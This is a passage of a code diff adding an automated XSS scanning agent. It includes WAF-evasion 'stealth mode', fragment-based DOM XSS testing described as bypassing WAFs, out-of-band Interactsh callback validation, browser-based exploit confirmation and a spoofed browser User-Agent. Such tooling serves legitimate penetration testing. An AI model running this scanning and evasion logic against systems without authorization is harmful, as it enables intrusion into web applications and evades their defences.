+            self.consecutive_blocks += 1
+            logger.warning(f"[{self.name}] Network Failure / WAF TCP Reset. Counter: {self.consecutive_blocks}")
+            
+            # TRIGGER STEALTH MODE
+            if self.consecutive_blocks >= 3 and not self.stealth_mode:
+                self.stealth_mode = True
+                dashboard.log(f"[{self.name}] 🛡️ WAF DETECTED! Entering Stealth Mode (Slown-down & Random Delay)", "WARN")
+                logger.warning(f"[{self.name}] WAF confirmed via network resets. Enabling Stealth Mode.")
+                
+            return ""
+    
+    async def _validate(
+        self,
+        param: str,
+        payload: str,
+        response_html: str,
+        method: str,
+        screenshots_dir: Path
+    ) -> tuple:
+        """Validate XSS using all available methods regardless of LLM suggestion.
+        The `method` argument is kept for logging but we will attempt Interactsh, Vision, and CDP sequentially.
+        """
+        evidence = {"payload": payload}
+
+        # 1️⃣ Interactsh (definitive OOB)
+        if self.interactsh:
+            # Short poll for immediate results
+            await asyncio.sleep(2) 
+            # Use the safe label
+            label = f"xss_{param}".replace("-", "").replace("_", "")[:20]
+            hit_data = await self.interactsh.check_hit(label)
+            if hit_data:
+                evidence["interactsh_hit"] = True
+                evidence["interactions"] = [hit_data]
+                dashboard.log(f"[{self.name}] 🚨 OOB INTERACTION DETECTED! (Interactsh)", "CRITICAL")
+                return True, evidence
+
+        # 2️⃣ Browser / Vision (screenshot + dialog + console)
+        # We use a helper to reconstruct the URL accurately
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        parsed = urlparse(self.url)
+        params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(parsed.query).items()}
+        params[param] = payload
+        attack_url = urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, urlencode(params), parsed.fragment
+        ))
+
+        dashboard.log(f"[{self.name}] 🌐 Launching browser validation...", "INFO")
+        result = await self.verifier.verify_xss(
+            url=attack_url,
+            screenshot_dir=str(screenshots_dir),
+            timeout=10.0 # Reduced from 30s to 10s for speed
+        )
+        
+        if result.success:
+            evidence.update(result.details)
+            evidence["vision_confirmed"] = True
+            evidence["screenshot_path"] = result.screenshot_path
+            evidence["method"] = result.method
+            dashboard.log(f"[{self.name}] 👁️ Browser validation succeeded ({result.method}).", "SUCCESS")
+            return True, evidence
+
+        # 3️⃣ DOM Reflection (Heuristic fallback)
+        if self.PROBE_STRING in response_html or payload in response_html:
+             # If we see reflection but browser didn't fire, it might be a subtle case
+             # or require user interaction. We mark it as potential.
+             evidence["potential"] = True
+             evidence["reason"] = "Reflection found in DOM but browser event did not fire."
+             return False, evidence
+        # No method succeeded
+        dashboard.log(f"[{self.name}] ❌ Validation failed for param '{param}'.", "WARN")
+        return False, evidence
+    
+    async def _test_fragment_xss(
+        self,
+        param: str,
+        interactsh_url: str,
+        screenshots_dir: Path
+    ) -> Optional[XSSFinding]:
+        """
+        Test Fragment-based XSS (DOM XSS via location.hash).
+        This bypasses WAFs because fragments (#payload) don't reach the server.
+        Level 7+ targets often use location.hash in innerHTML/eval, creating DOM XSS.
+        """
+        dashboard.log(f"[{self.name}] 🔗 Testing FRAGMENT XSS (bypassing WAF via location.hash)...", "INFO")
+        
+        for fragment_template in self.FRAGMENT_PAYLOADS:
+            payload = fragment_template.replace("{{interactsh_url}}", interactsh_url)
+            
+            # Build fragment URL - CRITICAL: Remove query params, payload goes in fragment ONLY
+            # Level 7's JS: if (location.hash) { innerHTML = decodeURIComponent(loc hash.substring(1)) }
+            from urllib.parse import urlparse, urlunparse
+            parsed = urlparse(self.url)
+            
+            # Construct clean URL: path only (no query), payload in fragment
+            fragment_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{payload}"
+            
+            dashboard.set_current_payload(payload[:60], "Fragment XSS", "Testing")
+            logger.info(f"[{self.name}] Testing Fragment: {fragment_url}")
+            
+            # Validate in browser (Fragment XSS requires browser execution)
+            try:
+                # Use updated verify_xss method
+                result = await self.verifier.verify_xss(
+                    url=fragment_url,
+                    screenshot_dir=str(screenshots_dir),
+                    timeout=10.0
+                )
+                
+                if result.success:
+                    dashboard.log(f"[{self.name}] 🎯 FRAGMENT XSS SUCCESS! ({result.method})", "SUCCESS")
+                    
+                    evidence = result.details or {}
+                    evidence["method"] = result.method
+                    evidence["screenshot_path"] = result.screenshot_path
+                    if result.console_logs:
+                        evidence["console_logs"] = result.console_logs
+
+                    return XSSFinding(
+                        url=self.url,
+                        parameter=f"#fragment (bypassed {param})",
+                        payload=payload,
+                        context="dom_xss_fragment",
+                        validation_method=f"vision+{result.method}",
+                        evidence=evidence,
+                        confidence=1.0,
+                        screenshot_path=result.screenshot_path,
+                        reflection_context="location.hash → innerHTML",
+                        surviving_chars="N/A (client-side)"
+                    )
+            except Exception as e:
+                logger.debug(f"Fragment test failed for {payload[:30]}: {e}")
+                continue
+        
+        logger.info(f"[{self.name}] No Fragment XSS found after testing {len(self.FRAGMENT_PAYLOADS)} payloads")
+        return None
+    
+    async def _discover_params(self) -> List[str]:
+        """Discover injectable parameters from the page."""
+        from bs4 import BeautifulSoup
+        from urllib.parse import urlparse, parse_qs
+        
+        discovered = []
+        
+        # 1. Extract from URL
+        parsed = urlparse(self.url)
+        for param in parse_qs(parsed.query).keys():
+            discovered.append(param)
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        }
+        
+        # 2. Extract from HTML forms
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(self.url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
+                    html = await resp.text()
+                    
+            soup = BeautifulSoup(html, 'html.parser')
+            
+            for inp in soup.find_all(['input', 'textarea', 'select']):
+                name = inp.get('name')
+                if name and name not in discovered:
+                    discovered.append(name)
+                    
+        except Exception as e:
+            logger.warning(f"Param discovery error: {e}")
+        
+        return discovered
+    
+    def _finding_to_dict(self, finding: XSSFinding) -> Dict:
+        """Convert finding to dictionary for JSON output."""
+        return {
+            "type": "XSS",
+            "url": finding.url,
+            "parameter": finding.parameter,
+            "payload": finding.payload,
+            "context": finding.context,
+            "reflection_context": finding.reflection_context,
+            "surviving_chars": finding.surviving_chars,
+            "validation_method": finding.validation_method,
+            "evidence": finding.evidence,
+            "confidence": finding.confidence,
+            "screenshot": finding.screenshot_path,
+            "validated": True,
+            "severity": "High"
+        }
+
+
+# =============================================================================
+# Convenience function
+# =============================================================================
+
+async def run_xss_scan(url: str, params: List[str] = None, report_dir: Path = None) -> Dict:
+    """Run XSS scan on target URL."""
+    agent = XSSAgent(url=url, params=params, report_dir=report_dir)
+    return await agent.run()
